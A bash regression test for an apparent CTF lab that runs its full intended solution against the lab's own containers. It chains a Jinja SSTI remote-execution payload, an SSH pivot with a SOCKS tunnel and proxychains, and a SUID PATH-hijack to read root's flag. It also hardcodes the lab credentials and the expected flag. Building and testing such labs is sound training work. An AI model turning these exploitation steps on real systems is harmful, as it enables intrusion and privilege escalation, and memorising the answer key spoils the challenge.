#!/usr/bin/env bash
# ============================================================================
#  solve.sh — automated golden-path regression test for the Ambiorix CTF.
#
#  Drives the FULL intended solution from inside the attacker container and
#  asserts the flag is recovered. Run after `docker compose up -d --build`.
#
#  Usage:
#     ./test/solve.sh
#     COMPOSE="podman-compose" ./test/solve.sh      # alternate compose tool
# ============================================================================
set -u

COMPOSE="${COMPOSE:-docker compose}"
EXEC="$COMPOSE exec -T attacker"

PIVOT=172.20.0.10
TARGET=10.10.10.10
EXPECTED='flag{atuatuca_ambush_54bc}'

WEB_USER=tiro;   WEB_PASS='AveLegioXIV-54'
SCOUT_PASS='FrontierWatch-54BC'
EBURO_PASS='ArduennaShadow'

say() { printf '\n\033[1;33m[*] %s\033[0m\n' "$1"; }
ok()  { printf '\033[1;32m    OK: %s\033[0m\n' "$1"; }
die() { printf '\033[1;31m[!] FAIL: %s\033[0m\n' "$1"; exit 1; }

say "Stage 0 — isolation invariant: attacker must NOT reach the target directly"
if $EXEC ping -c1 -W2 "$TARGET" >/dev/null 2>&1; then
  die "attacker reached $TARGET directly — the pivot is not enforced!"
fi
ok "target $TARGET is unreachable from the frontier (as intended)"

say "Stage 1 — foothold: log in to the web console and get SSTI RCE"
FLAG=$($EXEC bash -c "
set -e
C=/tmp/jar_solve
# log in with the leaked recruit creds
curl -s -c \$C -b \$C -d 'username=$WEB_USER&password=$WEB_PASS' http://$PIVOT/login -o /dev/null
# SSTI RCE: read the deploy notes to recover the scout SSH creds
SSTI='{{ cycler.__init__.__globals__.os.popen(\"cat /opt/castra/DEPLOY_NOTES.txt\").read() }}'
curl -s -c \$C -b \$C --data-urlencode 'report=' --data-urlencode \"sigil=\$SSTI\" http://$PIVOT/board \
  | grep -q 'scout / $SCOUT_PASS' || { echo 'NO_CREDS'; exit 1; }

# Stage 2 — pivot: SSH into castra, read the muster roll, open a SOCKS tunnel
export SSHPASS='$SCOUT_PASS'
SSHOPTS='-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR'
sshpass -e ssh \$SSHOPTS scout@$PIVOT 'cat ~/muster.txt' \
  | grep -q 'eburo / $EBURO_PASS' || { echo 'NO_MUSTER'; exit 1; }

pkill -f 'ssh.*-D 1080' 2>/dev/null || true
sshpass -e ssh \$SSHOPTS -fN -D 1080 scout@$PIVOT
sleep 2

# Stage 3 — inner objective: proxychains to the target, SUID PATH-hijack privesc
export SSHPASS='$EBURO_PASS'
OUT=\$(proxychains4 -q sshpass -e ssh \$SSHOPTS eburo@$TARGET '
  cd /tmp
  printf \"#!/bin/sh\ncat /root/flag.txt\n\" > date
  chmod +x date
  PATH=/tmp:\$PATH /usr/local/bin/castellum
' 2>/dev/null)
pkill -f 'ssh.*-D 1080' 2>/dev/null || true
echo \"\$OUT\" | grep -o 'flag{[^}]*}' | head -1
")

say "Result"
echo "    recovered: '${FLAG:-<none>}'"
[ "$FLAG" = "$EXPECTED" ] || die "flag mismatch (got '${FLAG:-<none>}', want '$EXPECTED')"
ok "golden path solved — $EXPECTED"
printf '\n\033[1;32m==== PASS ====\033[0m\n'
